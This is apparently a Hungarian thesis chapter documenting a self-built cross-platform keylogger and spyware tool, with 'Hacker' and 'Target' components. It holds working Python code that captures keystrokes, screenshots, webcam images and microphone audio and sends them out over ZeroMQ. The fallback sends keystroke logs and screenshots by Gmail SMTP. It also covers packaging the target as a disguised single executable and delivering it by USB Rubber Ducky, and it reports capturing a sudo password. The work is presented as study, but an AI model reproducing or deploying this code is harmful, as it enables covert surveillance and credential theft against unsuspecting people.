Előszőr, hogy működjön a gyakori operációs rendszereken meg kell nézni, hogy melyiken futtatjuk. Ezt a platform modul system függvény segítségével tudjuk megnézni, amely a $get\_system\_name\_and\_path$ függvényben van implementálva. Beolvasásra kerül az általunk megírt loggolási konfigurációs fájl (logging.conf) és egyes adatok tárolásához alkalmas konfigurációs fájl (config.ini). A $logging.conf$ tartalmazza a loggolási szintet (DEBUG), a loggolás nevét, hogy beolvasáskor tudjunk hivatkozni rá (itt meg lehet adni több loggolási mintát) és a kiírt üzenet formátumát. A $config.ini$ tartalmazza azokat az értékeket amelyeket hard kódolni kellene, mint például a portok, ip címek, jelszavak, felhasználók, stb.

\lstinputlisting[language=Python, firstline=13, lastline=23]{../src/HackerApp.py}

Ha nem a három operációs rendszer közé tartozik, akkor kilép a program. Itt a rendszer neve meghatározza a $temp\_path$ változót. Ez a változó tartalmazza a temporális könyvtárat az operációs rendszeren, hogy a lenyomott billentyűket eltudja menteni a Target számítógépén. A temporális mappa Linux és Darwin (MacOS) rendszereken megegyező, míg Windows rendszeren különbözik.

A Hacker oldalon három osztály talalható (Communication, Keylogger, MenuHandler) és ehhez még hozzácsatolódik a GUI rész is, lásd ábra \ref{fig:serverclassdia}. A Hacker alkalmazás futását nem befolyásolja a GUI működése.
\begin{figure}[H]
\centering
\includegraphics[width=400pt]{../images/hackerclassdiagram}
\caption{Hacker oldali osztály diagram}
\label{fig:serverclassdia}
\end{figure}

\subsection{GUI}\label{subsubsec:gui}
A GUI a tkinter modul használatával készült. A tkinter modul csak a fő szálon engedi az általa létrehozott objektumok futását.
A GUI akkor lép működésbe, amikor Target oldal csatlakozott a Hacker oldalhoz, és addig funkcionál, amíg a Hacker be nem zárja. Van egy $Date\ \&\ Time$ és egy $Characters$ mezője. Az első oszlop tartalmazza az idő béjeget, hogy mikor volt egy bizonyos karakter megnyomva. A második oszlop a lenyomott karaktereket taartalmazza kezdésben. Három gomb találhato az ablak tetején: $PC\ Information$, $Characters$ és $Words$.
\begin{figure}[H]
\centering
\includegraphics[width=400pt, height=435pt]{../images/GUI\ final}
\caption{GUI ablak}
\label{fig:gui}
\end{figure}

\subsection{CommunicationHacker osztály}\label{subsubsec:serverclass}
A CommunicationHacker osztály megvalósít két kapcsolatot a ZeroMQ protokollt használva. A két kapcsolat a következő: publisher (PUB) | subscriber (SUB) és request (REQ) | reply (REP). A PUB | SUB egy kapcsolaton keresztül történik a Target számítógépének információ és a lenyomott billetyű karaktereinek átvitele. Ez egy egyoldali kommunikáció, mert a PUB a Target oldal és erre feliratkozik (subscribe) a Hacker oldal. Az egyoldali kommunikáción csak a Target oldal küld aldatot és a Hacker oldal fogadja azokat. Itt a Hacker oldal vár egy üzenetet, hogy blokkolódjon amíg a Target nem kapcsolódik. Ha a Hacker oldal megkapja az ``OK'' üzenetet, akkor fut tovább a program.

A REQ | REP egy kétoldali kommunikáció, mert a Hacker oldal küld kéréseket a Target oldal fele, és a Target oldal elvégzi a kért műveleteket és az eredményt elküldi a Hacker oldalnak. Ezen a kommunikáción van megvalósítva a Hacker oldali és a Target oldali menü kezelése.

A háttérben a ZeroMQ protokoll TCP kapcsolatot hoz létre, de nem kell foglalkozni a csomagkezeléssel. A lenti ábrákon az általános kapcsolatok vannak ábrázolva.

A publisher feladata az üzenetek küldése témákon belül. Az üzeneteket csak azok kapják meg, akik feliratkoztak a bizonyos témára, lásd ábra \ref{fig:pubsub}
\begin{figure}[H]
\centering
\includegraphics{../images/pubsubrel}
\caption{ Egy publisher több subscriber kapcsolat}
\label{fig:pubsub}
\end{figure}
A mi esetünkben a publisher szerepét a Target játsza és a subscriber a Hacker. Meg lehet oldani a több Target és egy Hacker kapcsolatát, ezért olyan ábrát kellene elképzelni, amelyen több publisher és egy subscriber van. Az ábra \ref{fig:pubsub2} hasonlít az általunk használt folyamatra:
\begin{figure}[H]
\centering
\includegraphics{../images/pubsubrel2}
\caption{Több publisher egy subscriber kapcsolat}
\label{fig:pubsub2}
\end{figure}

\subsection{KeyloggerHacker osztály}\label{subsubsec:keyloggerclass}
A KeyloggerHacker osztályt a $Thread$ osztályból van származtatva, mert egy külön szálon kell fusson a GUI miatt. A GUI csak a fő szálon van engedélyezve, mert a tkinter modul nem engedi, hogy a létrehozott objektumok mellékszálakon fussanak. Ennek az osztálynak kilenc attribútumja van: a létrejött kapcsolat a Hacker oldal és a Target oldal között, a GUI, gmail cím, a hozzá tartozó jelszó, a gmail szolgáltató címe, a rendszer temporális könyvtára, a menü, a logger, amely a loggolást segíti és a konfigurációt tartalmazó adatstruktúra. A gmail rendelkezik egy szolgáltatóval, amely lehetővé teszi a kódból való levél küldését és fogadását (a fogadás külön szolgáltatót használ). A $connection$, a $gui$ és a menü paraméterek egy-egy osztályt várnak.

A $KeyloggerHacker$, a fő osztály, amelyre épül a szoftver. Mivel külön szálon fut, ezért felül kell írni a $run$ függvényt, amelyben implementálva van a billentyűzet gombjai lenyomásának a kezelése és az e-mail fogadása. Amíg a kapcsolat él a CommunicationHacker modulban, addig azon keresztül küldi a lenyomott karaktereket, amit elment a log.csv állományba a Hacker oldalon, hogy a későbbiekben újra megtekinthető legyen. A log.csv állomány formátuma lenyomott billentyű ideje, karakter. Ahol az idő ``nap/hónap/év $|$ óra:perc:másodperc'' formátumban van megadva.

A kapcsolat megszakadhat, ha például a tűzfal (firewall) megtíltja a használt porton való kommunikációt, így egy elérhető kommunikációt kell használni, esetünkben ez az e-mail használatát jelenti.

A Hacker és a Target oldalon egy modul kommunikál egymással. A Hacker oldalon létrehozza az egyoldalu kommunikációt, és vár a Target válaszára. A kommunikáció kell tartalmazza a Hacker oldali ip címet és a két portot, amiket a Target oldalon kell megadni. A Hacker oldalon csak a megnyitott portok a lényegesek, amelyeken kommunikál az applikáció. Erre terveztünk egy saját kis csomagot, lásd táblázat \ref{tab:protocol}:
\begin{table}[H]
\centering
\caption{Csomag}
\label{tab:protocol}
\begin{tabular}{|c|c|c|}
\hline
\textbf{type} & \textbf{time} & \textbf{information} \\
\hline
5 & 11 & $2^{16}-1-5-11$ \\
\hline
\end{tabular}
\end{table}
A $type$ mező megmondja, hogy milyen típusu adat fog jönni az $information$ mezőben. Ez 5 bájt lehet. Előfodulható lehetőségek:
\begin{itemize}
\item chars - egy karakter
\item image - egy képernyőkép bájtsorozata
\item wcpic - egy webkamera kép bájtsorozata
\item audio - egy audio állomány bájtsorozata
\end{itemize}
A $time$ mezőben egy időbéjeg található, amely megmondja, hogy a csomag mikor érkezett. Ez 11 bájt lehet. Formátuma: ``nap\_óra\_perc\_másodperc''.\\
Az $information$ mezőben vannak azok az adatok amelyeket a Hacker oldal fel kell dolgozzon. A mező mérete alkalmazkodik a háttérben megvalósított TCP méretével.

A továbbiakban az adatok feldolgozásra kerülnek, ha a kapcsolat még nem zárult be. Az adatok beíródnak egy-egy állományba. Ha az $infomation$ mezőben az ``Error'' szöveg érkezik, akkor sikertelen volt az adatküldés, és a program egy üzenetet ír ki a vezérlőablakra, hogy tudassa a sikertelen folyamatot. A $data$ változó tartalmazza a protokoll által található információt.
\begin{lstlisting}[language=Python]
if data[0] == "chars":
	write_file(os.path.join(path, filename), data[1:])
	if self.gui.gui_running:
		self.gui.insert_data(data[1:])
	elif data[0] == 'close':
		self.connection.socket_stream.close()
		logger.info("Connection closed!\n")
		break
\end{lstlisting}

Ha a kapcsolat felbomlik, akkor e-mail-en keresztül lesz továbbítva az adat csatolmányban. Ahoz, hogy írni és olvasni is tudjunk e-mail-t python kódból, a google fióknál be kell legyen kapcsolva a ``Less secure app access''. A gmail fióknál pedig a következőt kell engedélyezni: Settings $\rightarrow$ See all settings $\rightarrow$ Forwarding and POP/IMAP $\rightarrow$ IMAP access $\rightarrow$ Enable IMAP.
\begin{figure}[H]
\centering
\includegraphics[width=400pt]{../images/lesssecureapp}
\caption{Konfigurációs beállítások a Google fióknál}
\label{fig:IMAPsettings}
\end{figure}
\begin{figure}[H]
\centering
\includegraphics{../images/enableIMAP}
\caption{Gmail beállítás}
\label{fig:IMAPsettings}
\end{figure}

Előszőr csatlakozni kell a megadott gmail címhez. Ez után megnézzük, hogy jött-e olyan e-mail, amit még nem láttunk, ha igen, akkor ellenőrizzük, hogy a saját gmail címünkről jött-e. Ha minden feltétel teljesül, akkor megnyitjuk az e-mail-t és letöltjük a csatolmányokat. Itt két csatolmány érkezik: egy képernyőkép és egy log állomány (ábra \ref{fig:emailresult}), amelyben a lenyomott billentyűk vannak naplózva. Ezt a folyamatot ismételjük addig, amíg nincsen hiba. Hiba alatt a következőket lehet érteni: nem engedi a csatlakozást a gmail szolgáltató, nem tudja megnyitni az elküldött csatolmányokat.
\begin{figure}[H]
\centering
\includegraphics[width=400pt]{../images/emailresult}
\caption{Az elküldött e-mail eredménye}
\label{fig:emailresult}
\end{figure}

A $get\_attachments$ függvény segítségével tölti le a csatolmányokat, amelynek egy paramétere van: az üzenet. Az üzenet tartalmazza a teljes üzenetet bájtokban, tehát, hogy kitől jött az üzenet, kinek küldték, a téma, maga az üzenet törzse, a csatolmányok. A függvény ezen az üzeneten megy végig és ha talál csatolmányt azt letölti, más szóval megnyit egy állományt binárisan és beleírja a tartalmát.
\begin{lstlisting}[language=Python]
def get_attachments(self, msg):
	for part in msg.walk():
	if part.get_content_maintype() == 'multipart':
		continue
	if part.get('Content-Disposition') is None:
		continue

	filename = part.get_filename()
	if bool(filename):
		with open(os.path.join(temp_path, filename), "wb") as handler:
			handler.write(part.get_payload(decode=True))
\end{lstlisting}

\subsection{MenuHandlerHacker osztály}\label{subsubsec:menuhandler}
A $MenuHandlerHacker$ osztály segítségével más feladatot is adhatunk a Target oldalnak a billentyűzet naplózása mellett. Ez az osztály is a $Thread$ osztályból származik, mert egy külön szál kell amiatt, hogy ne blokkolódjon az adatfeldolgozás, mivel I/O műveleteket végez.  Ennek az osztálynak három attribútumja van: a kapcsolat, a loggolást tartalmazó konfiguráció és egy logikai változó, amely megmondja, hogy a fut vagy nem fut a szál. A kapcsolat fogja megvalósítani az opciók küldését a kliensnek. Itt négy opció lehet:
\begin{itemize}
\item 1) Take screenshot - képernyőkép
\item 2) Webcam picture - webkamerakép
\item 3) Record audio - audio felvétel
\item 4) Exit - bezárja a kapcsolatot
\end{itemize}

Amint látszik a menü a parancssoron (ábra \ref{fig:logging}), meg kell jelenjen egy vezérlő, ami mutatja, hogy hova kell írni az opciókat (vezérlő: ``$>>>$'').
Természetesen le van kezelve, ha nem 1-től 4-ig adunk meg számokat, akkor egy üzenetet ír ki: ``Wrong option!'', vagy ha csak lenyomjuk az ENTER karaktert, akkor egyszerűen új sorba ugrik, és kiírja a vezérlőt.

Itt kezelve van a kérésre visszaküldött adat:
\begin{lstlisting}[language=Python]
if data[0] == "image":
	if data[2] == 'Error':
		self.logger.info("Error while taking screenshot!")
	else:
		with open(f'./screenshot_{data[1]}.png', 'wb') as handler:
			handler.write(data[2])
			self.logger.info('Done')
elif data[0] == "wcpic":
	if data[2] == 'Error':
		self.logger.info("Error while taking webcam picture!")
	else:
		with open(f'./webcam_{data[1]}.png', 'wb') as handler:
			handler.write(data[2])
			self.logger.info('Done')
elif data[0] == 'audio':
	if data[2] == 'Error':
		self.logger.info("Error while recording audio!")
	else:
		with open(f'./audio_{data[1]}.wav', 'wb') as handler:
			handler.write(data[2])
			self.logger.info('Done')
\end{lstlisting}

\subsection{Bináris állomány generálása python kódból}
A futtatható fájlt, vagy bináris állományt a Python \textit{pyinstaller} moduljával lehet elkészíteni. Ez persze személyes választás, mivel nem csak ez az egy modul van erre a célra tervezve a Python nyelvben (ilyen modul például a \textit{py2exe} is). Azért lett a pyinstaller modul választva, mert támogatja a Windows, a Linux és a Mac rendszereket it, míg a py2exe csak a Windows rendszerekhez használható. A modul 4.1 verzióját érdemes használni, mivel vannak más modulok is, amelyeknek nem a legújabb verzióját használjuk (pynput, zmq) a kompatibilitás szempontjából.

Megnyitunk egy cmd vagy PowerShell-t Windows-on, terminált Linux-on vagy Mac-en és a következő parancsot használjuk:
\begin{lstlisting}{language=PowerShell}
pyinstaller --onefile --name ``nev'' --icon ``icon path'' TargetApp.pyw
\end{lstlisting}

A \textit{onefile} opció összesűríti egy állományba az összes állományt, így nem szükséges a futtatható állomány mellé elküldeni azokat a fájlokat amellyekre szüksége lenne. A \textit{name} opcióval megadhatjuk a bináris állomány nevét, és az \textit{icon} opcióval egy ikont is adhatunk neki. Legvégül megadjuk azt a python állományt, amelyik elindítja a szoftvert.

\section{Target oldal}\label{subsec:client}
A Target oldal is három osztályt tartalmaz, mint a Hacker oldal, ha nem vesszük számításba a GUI-t, mert a GUI egy különálló alkalmazás, csak a Hacker oldal fogja aktíválni, lásd ábra \ref{fig:clientclassdia}.

Előszőr, meg kell nézni, hogy milyen rendszeren van futtatva. Ez után létre van hozva a $CommunicationTarget$ osztály, amelynek négy attribútumja van: egy ip cím, két port (egy a PUB SUB kapcsolatnak és egy a REQ REP kapcsolatnak) és a ZeroMQ által létrehozott kontextus. Példányosításkor a Hacker publikus ip címét kell megadni.

\begin{figure}[H]
\centering
\includegraphics[width=400pt]{../images/targetclassdiagram}
\caption{Target oldali osztály diagram}
\label{fig:clientclassdia}
\end{figure}

\subsection{CommunicationTarget osztály}\label{subsubsec:clinetclass}
A kapcsolat létesítésében a $connect2stream$ és a $connect2interact$ függvények játszanak szerepet. A connect2stream megvalósítja a PUB SUB kapcsolatot, míg a connect2interact a REQ REP kapcsolatot. A $CommunicationTarget$ osztály segítségével fog a Target kapcsolódni a Hackerhez. Az $urllib.request$ modul $openurl$ függvényét alkalmazva megnyitunk a publikus ip cím lekérő api-t (https://api.ipify.org) és kérést küldünk, amellyel megkapjuk a Target publikus ip címét.

\subsection{KeyLoggerTarget osztály}\label{subsubsec:keyloggerclientclass}
Ez az osztály valósítja meg a lenyomott billentyűk kezelését. Kilenc attribútumot tartalmazó osztály: a kapcsolat, gmail cím, gmail jelszó, gmail szolgáltató, gmail port, a lenyomott billentyűt tartalmazó változó, a rendszer temporális könyvtára és a rendszer neve.

Az első adat nem követi a megállapított csomag felépítését. Ez az adat tartalmazza a Target rendszerének információit:
\begin{itemize}
\item system name
\item device name
\item release
\item version
\item architecture
\item cpu info
\item user name
\item ip address
\end{itemize}
Ezek után el lesz indítva egy halgató, amely lehalgatja a számítógéphez csatlakoztatott billentyűzetet, amely akkor írja felül a $keys$ attribútumot, amikor a felhaszáló elengedi a billentyűt.
\begin{lstlisting}{language=Python}
keyboard_listener = Listener(on_release=self.on_release)
keyboard_listener.start()
\end{lstlisting}
Az attribútum felülírásáról az $on\_release$ függveny gondoskodik.
\begin{lstlisting}{language=Python}
def on_release(self, key):
	self.keys = key
\end{lstlisting}

A billentyűzet lehalgató után felépítődik az adat, amit a kapcsolaton keresztül elküld. Minden adatépítés után a $keys$ változó a $None$ értéket veszi fel. Adatépítésre és küldésre csak akkor kerül sor, ha a $keys$ változó nem $None$.
\begin{lstlisting}{language=Python}
if self.keys is not None:
	date_time = get_time()
	key = str(self.keys).replace("'", "")
	data = ["chars", date_time, key]
	self.keys = None
	data = str(data)
\end{lstlisting}
A $get\_time$ függvény visszatéríti az adott időt ``nap/hónap/év $|$ óra:perc:másodperc'' formátumban.
\begin{lstlisting}{language=Python}
'''
Gets current time

@return: time in dd/mm/yyyy | HH:MM:SS format
'''
def get_time():
	date_time = datetime.now().strftime("%d/%m/%Y | %H:%M:%S")
	return date_time
\end{lstlisting}
A $keys$ változóba karakterként vagy karakterláncként kerül a lenyomott billentyű, ezért le kell cseélni a szélső idézőjeleket üres karakterekre. Karakter helyett akkor kerül karakterlánc, ha olyan karaktereket nyomunk le, amelyek nem nyomtathatóak, például: $ENTER$, $SPACE$, stb. Ilyenkor $Key.enter$ vagy $Key.space$ stb formátumban kapjuk meg.

A hálózaton közlekedő adatokat meg lehet nézni a wireshark szoftverrel, amelyet csomagok analizálására használnak. Észre lehet venni, hogy az adatok emberileg olvashatóak (ábra \ref{fig:packetcapture}), ezért a python base64 modulját alkalmazva kódoljuk a küldendő adatokat. A kódolás után a $pickle$ modul segítségével bájtokká tömörítjük az adatokat.
\begin{figure}[H]
\centering
\includegraphics[width=400pt]{../images/wiresharkcapture}
\caption{A csomag wireshark-al elfogva}
\label{fig:packetcapture}
\end{figure}

Ha a kapcsolat felbomlott, akkor e-mail-en keresztül küldi tovább az adatokat óránként. Itt lépnek érvénybe a gmail cím, a jelszó, a gmail szolgáltatás, és a gmail port. Az adat felépítése ugyan úgy zajlik, mint a kapcsolat alatt. Ebben az esetben a lenyomott billentyűket összegyűjti egy állományba és azt csatolja később az e-mail-hez a képernyőképpel együtt. Egy e-mail felépítése python 3-ban:
\begin{lstlisting}{language=Python}
msg = MIMEMultipart()
msg['From'] = self.email_address
msg['To'] = self.email_address
msg['Subject'] = 'Keylogger result'
body = date_time
msg.attach(MIMEText(body, 'plain'))
file_attachment = MIMEBase('application', 'octet-stream')

with open(os.path.join(temp_path, filename), 'rb') as handler:
	file_attachment.set_payload(handler.read())

encoders.encode_base64(file_attachment)
file_attachment.add_header('Content-Disposition', "attachment; filename=" + filename)
msg.attach(file_attachment)

if take_screenshot(self.temp_path):
	image_attachment = MIMEBase('application', 'octet-stream')

	with open(os.path.join(self.temp_path, "screenshot.png"), 'rb') as handler:
		image_attachment.set_payload(handler.read())

	encoders.encode_base64(image_attachment)
	image_attachment.add_header('Content-Disposition', "attachment; filename=screenshot.png")
	msg.attach(image_attachment)

content = msg.as_string()
\end{lstlisting}
Miután felépítettük az e-mail-t, kell csatlakozni a gmail szolgáltatóhoz és elküldeni azt. Ha az e-mail sikeresen el lett küldve, akkor az az állomány, amelybe a lenyomott billentyűket mentettük, törlésre kerül, hogy ne küldjük el ugyan azt mégegyszer. A $content$ változó tartalmazza a teljes e-mail-t a csatolmányokkal együtt.
\begin{lstlisting}{language=Python}
with smtplib.SMTP(self.smtp_alias, self.smtp_port) as smtp_server:
	smtp_server.starttls()
	smtp_server.login(self.email_address, self.email_password)
	smtp_server.sendmail(self.email_address, self.email_address, content)

if os.path.isfile(os.path.join(temp_path, filename)):
	os.remove(os.path.join(temp_path, filename))
if os.path.isfile(os.path.join(temp_path, "screenshot.png")):
	os.remove(os.path.join(temp_path, "screenshot.png"))
\end{lstlisting}

\subsection{MenuHandlerTarget osztály}\label{subsubsec:menuhandlerclinet}
A $MenuHandlerTarget$ osztály foglalkozik az opciók fogadásával, és az opciók által elvégzett feladatokkal. Ez az osztály egy külön szálon kell, hogy fusson, máskülönben blokkolná a fő szálat, ahol a billentyűzetet hallgató osztály fut, lasd \pageref{subsubsec:keyloggerclientclass}. oldal \ref{subsubsec:keyloggerclientclass}, ezért a $Thread$ osztályból származtatjuk.
A Hacker oldaltól kapott opciók döntik el, hogy milyen adatot épít fel, és küld el a program:
\begin{itemize}
\item 1 - képernyőkép
\item 2 - webkamerakép
\item 3 - hangrögzítés
\item 4 - felbontja a kapcsolatot
\end{itemize}
\begin{lstlisting}{language=Python}
date_time = datetime.now().strftime("%d_%H_%M_%S")
if option == '1':
	data = ["image", date_time]

	if take_screenshot(self.temp_path):
		if os.path.isfile(os.path.join(self.temp_path, "screenshot.png")):
			with open(os.path.join(self.temp_path, "screenshot.png"), 'rb') as handler:
				data.append(handler.read())
		else:
			data.append("Error")
	else:
		data.append("Error")
	try:
		data =b64encode(str(data).encode())
		data = pickle.dumps(data)
		self.connection.socket_interact.send(data)
	except Exception:
		break
elif option == '2':
	data = ["wcpic", date_time]

	if take_webcam_picture(self.temp_path):
		if os.path.isfile(os.path.join(self.temp_path, "wc_picture.png")):
			with open(os.path.join(self.temp_path, "wc_picture.png"), 'rb') as handler:
				data.append(handler.read())
		else:
			data.append("Error")
	else:
		data.append("Error")
	try:
		data = b64encode(str(data).encode())
		data = pickle.dumps(data)
		self.connection.socket_interact.send(data)
	except Exception:
		break
elif option == '3':
	data = ["audio", date_time]

	if record_audio(self.temp_path):
		if os.path.isfile(os.path.join(self.temp_path, "rec_audio.wav")):
			with open(os.path.join(self.temp_path, "rec_audio.wav"), 'rb') as handler:
				data.append(handler.read())
		else:
			data.append("Error")
	else:
		data.append("Error")
	try:
		data = b64encode(str(data).encode())
		data = pickle.dumps(data)
		self.connection.socket_interact.send(data)
	except Exception:
		break
elif option == '4':
	data = ["close", date_time, "Exit"]
	data b64encode(str(data).encode())
	data = pickle.dumps(data)
	self.connection.socket_stream.send(data)
	self.connection.socket_stream.close()
	self.connection.socket_interact.close()
	break
\end{lstlisting}

A $take\_screenshot$ függvény fogja megcsinálni a képernyőképet, amely igazat térít vissza, ha sikerült lementenie a képet a $save\_path$ változó tartalmazta helyre. Ugyan ezek érvényesek a $take\_webcam\_picture$ és a $record\_audio$ függvényekre is.
\begin{lstlisting}{language=Python}
def take_screenshot(save_path):
	try:
		pyautogui.screenshot(os.path.join(save_path, "screenshot.png"))
	except Exception:
		return False
	return True

	
def take_webcam_picture(save_path):
	video_capture = cv2.VideoCapture(0)
	if video_capture.isOpened():
		rval, frame = video_capture.read()
		cv2.imwrite(os.path.join(save_path, "wc_picture.png"), frame)
		return True
	return False


def record_audio(save_path):
	chunk = 1024
	sample_format = pyaudio.paInt16 # 16 bits per sample
	channels = 2
	fs = 44100 # Record at 44100 samples per second
	seconds = 10

	pa = pyaudio.PyAudio()

	try:
		stream = pa.open(format=sample_format, channels=channels, rate=fs, frames_per_buffer=chunk, input=True)
		frames = []

		for i in range(0, int(fs / chunk * seconds)):
			data = stream.read(chunk)
			frames.append(data)

		stream.stop_stream()
		stream.close()
		pa.terminate()

		wf = wave.open(os.path.join(save_path, "rec_audio.wav"), 'wb')
		wf.setnchannels(channels)
		wf.setsampwidth(pa.get_sample_size(sample_format))
		wf.setframerate(fs)
		wf.writeframes(b''.join(frames))
		wf.close()
	except Exception:
		return False
	return True
\end{lstlisting}
A hangrögzítés egy kicsivel másképp kezelendő, mert meg kell mondani, hogy egy részt hány bájton abrázoljon (1024), milyen formátumba ábrázolja (16 bit int), hány csatornán (2) ábrázolja a hanghullámokat, mekkora frekvencián (44.1 kHz) és hány másodperces felvételt akarunk elmenteni (10). Ezek a függvények egy úgynevezett $utils.py$ mellékállományban vannak implementálva, amely említésre kerül a komponensek bemutatásánál.

\chapter{Kísérleti eredmények}\label{sec:testcases}
A szoftver teszteléséhez létrehoztunk egy-egy viruális gépet a gyakori operációs rendszerekről, és valós gépeken is teszteltük. A virtuális gépek létrehozásához a VMware Workstation szoftvert használtuk, lásd ábra \ref{fig:VMware1}
\begin{figure}[H]
\centering
\includegraphics[width=400pt]{../images/VMware1}
\caption{VMware Workstation}
\label{fig:VMware1}
\end{figure}

\section{Virtuális gépeken való kísérlet}
Három virtuális gépet kellett létrehozni, és telepíteni a Windows, Linux és Mac operációs rendszereket. Ezekre a gépekre telepítettük a python 3.X verzióját és a szükséges csomagok a tesztelés kivitelezéséhez. A rendszer elindítása után csatlakoztatjuk a USB Rubber Ducky-t, amely letölti a futtatható (EXE vagy ELF) fájlt a rendszerre.

Az EXE a Windows rendszerekre jellemző futtatható fájlok. Az ELF pedig a UNIX rendszerekre jellemző, mivel az EXE egy fájl kiterjesztése (például: keylogger.exe), UNIX redszereken a fájl kiterjesztése elhanyagolható (például: keylogger).

A hálózat kialakítása az első fázisban alacsony szintű TCP kapcsolt volt. Mivel nagyobb méretű adat érkezett (például kép), mint egy karakter, ezért a virtuális gépeken nem küldte át. A második fázisban áttértünk a ZeroMQ protokoll használatára és ez megoldotta a problémát.

A következő alfejezetek a különböző operációs rendszereken mért eredményeket mutatják be.

\subsection{Windows rendszer (VM)}
A rendszer specifikációi: 4 processzor (processzorok száma: 1, mag/processzor: 4), 4 GB memória, 60 GB merevlemez tárhely, 64 bites arhitektúra, Windows 10 Pro.

Két felhasználót készítettünk, egy az alapértelmezett, amelyik adminisztrátor jogosultsággal rendelkezik (John), a másik egy hétköznapi felhasználó (Steve). Steve felhasználónak szüksége van John felhasználó jelszavára, ha olyan dolgokat akar végrehajtani, amelyekhez nincs jogosultsága.

Steve felhasználót használva, ha be szeretnénk lépni John felhasználó mappájába, akkor felugrik egy ablak, amely kéri az admin jelszavát, lásd ábra \ref{fig:winVM1}. Ebben a helyzetben az  általunk fejlesztett keylogger nem képes elfogni a lenyomott billentyűket. Bármely más helyzetben sikeresen elfogja a lenyomott billyentyűket.
\begin{figure}[H]
\centering
\includegraphics[width=400pt, height=300pt]{../images/windowsVM1}
\caption{Jogosultságkezelő ablak}
\label{fig:winVM1}
\end{figure}

\subsection{Linux rendszer (VM)}
A rendszer specifikációi: 16 processzor (processzorok száma: 4, mag/processzor: 4), 8 GB memória, 200 GB merevlemez tárhely, 64 bites arhitektúra, Kali Linux KDE.

Létrehoztunk egy felhasználót (John) adminisztrátor jogosultsággal. John felhasználóval meg szeretnénk nézni, hogy milyen parancsokat futtathatunk admin jogosultsággal. Ezt a \textit{sudo -l} paraccsal nézhetjük meg.  Ehhez szükséges megadni a felhasználó (John) jelszavát. Észrevettük, hogy a szoftver elfogja a jelszó mezőbe írt karaktereket is.  Az ábra \ref{fig:linuxVM1} mutatja, hogy a pirossal bekeretezett részen John felhasználó jelszava található, amit az ábra \ref{fig:linuxVM2} jelszó mezőjébe beírtunk (jelszó mező: [sudo] password for john:). Teszteléshez a Z shell-t (zsh) használtuk, amely egy kiterjesztett Bourne shell (bash) sok újítással.
\begin{figure}[H]
\centering
\includegraphics[width=450pt]{../images/linuxVM2}
\caption{John felhasználó terminálja}
\label{fig:linuxVM2}
\end{figure}
\begin{figure}[H]
\centering
\includegraphics[width=400pt]{../images/linuxVM1}
\caption{Az elfogott karakterek}
\label{fig:linuxVM1}
\end{figure}

\subsection{Mac rendszer (VM)}
A rendszer specifikációi: 2 processzor (processzorok száma: 1, mag/processzor: 2), 8 GB memória, 100 GB merevlemez tárhely, 64 bites arhitektúra, MacOS Catalina 10.15.5.

Az operációs rendszer telepítésekor létrehoztunk egy felhasználót (John), akinek adminisztrátor jogosultsága van. A szoftver elindításakor (ha terminálból indítjuk el) felugrik egy ablak, amely kérvényezi a billentyűzet monitorizálásához az engedélyt, lásd ábra \ref{fig:macVM1}. Így csak akkor működik a szoftver miután a felhasználó engedélyezte, ha nincs alapból engedélyezve. Ez a helyzet fentáll akkor is, ha kameraképet szeretnénk készíteni, és esetekben a képernyőképnél is.
\begin{figure}[H]
\centering
\includegraphics[width=450pt, height=105pt]{../images/macVM1}
\caption{Engedélyező ablak MAC rendszeren}
\label{fig:macVM1}
\end{figure}

Feltételezzük, hogy az engedély a billentyűzet monitorizálásához megvan, így el tudjuk fogni a leütött billentyűket. Ebben az esetben is, mint a Windows rendszer esetében, ha admininisztrátor jogosultság kell egy feladat elvégzéséhez, akkor azt a jelszót nem tudjuk elfogni. Az ábra \ref{fig:macVM2} szemlélteti, hogy a megadott jelszót nem tudjuk elfogni.
\begin{figure}[H]
\centering
\includegraphics[width=450pt]{../images/macVM2}
\caption{Terminálon végzett feladat John felhasználóval}
\label{fig:macVM2}
\end{figure}

A \textit{sudo -l} paranccsal meg szeretnénk nézni, hogy John felhasználó milyen parancsokat futtathat admin jogosultsággal. Tesztelésre a Z shell-t (zsh) alkalmaztuk, mint a Linux operációs rendszer esetében.

Azt vettük észre ebben a helyzetben, hogy a készített képernyőkép nem tartalmazza a megnyitott ablakokat csak a hátteret.

\section{Valós gépeken való kísérlet}
Valós gépek alatt a saját laptopomat és asztali gépemet használtam tesztelésre, Windows és Linux operációs rendszereken. Mac operációs rendszer alatti tesztelésben egyik rokonom segített ki egy Apple laptoppal.

A tesztek eredményei teljesen megeggyeztek a virtuális gépeken való tesztek eredményeivel. Ebben az esetben is a bejelentkezési jelszavak elfogására törekedtem. Windows és Mac rendszereken nem tudtam a jelszavakat begyűjteni, míg Linux rendszeren ez sikeres volt. A virtuális gépeken levő operációs rendszerek és a valós gépeken levő operációs rendszerek verziója között nem volt nagy eltérés. A kicsi eltérés alatt azt értem, hogy az operációs rendszerek megeggyeztek, csak egyes helyeken frissített verzión teszteltem és máshol peding régebbi verzión.

A következö alfejezetek tartalmazzák a Windows és Linux rendszereken való teszttelést. Mac rendszerre nem volt lehetőségem képeket hozni, mivel nincs birtokomban Apple gép.

\subsection{Windows rendszer}
Windows rendszeren az asztali számítógépemet használtam a Hacker oldalnak és a laptopomat a Target oldalnak. Előszőr a Hacker el kell indítson egy szervert, ahonnan a Target gépére kerül a futtatható kód. A szervert egy python modul segítségével indítjuk el és kiválasztjuk a 777 portot. A modul neve \textit{updog}. Ezt a modult a python http.server moduljával implementálták. Az ábra \ref{fig:winPC1} mutatja a szerver elindítását.
\begin{figure}[H]
\centering
\includegraphics[width=450pt]{../images/windowsPC1}
\caption{A szerver elindítása}
\label{fig:winPC1}
\end{figure}

A szerverrel egyszerre elindítjuk a Hacker oldalon a szoftverünket. Az ábra \ref{fig:winPC4} mutatja a szoftver elindítását.
\begin{figure}[H]
\centering
\includegraphics[width=450pt]{../images/windowsPC4}
\caption{A keylogger elindítása a Hacker oldalon}
\label{fig:winPC4}
\end{figure}

Ha a szerver elindult, akkor a Target gépére letöltjük az EXE fájlt, és elindítjuk. A letöltést az ábra \ref{fig:winPC2} mutatja, és azt, hogy fut a rendszeren az ábra \ref{fig:winPC3} mutatja.
\begin{figure}[H]
\centering
\includegraphics[width=450pt]{../images/windowsPC2}
\caption{Exe fájl letöltése a Target gépén}
\label{fig:winPC2}
\end{figure}
\begin{figure}[H]
\centering
\includegraphics[width=450pt]{../images/windowsPC3}
\caption{A feladat kezelő ablak tartalma}
\label{fig:winPC3}
\end{figure}

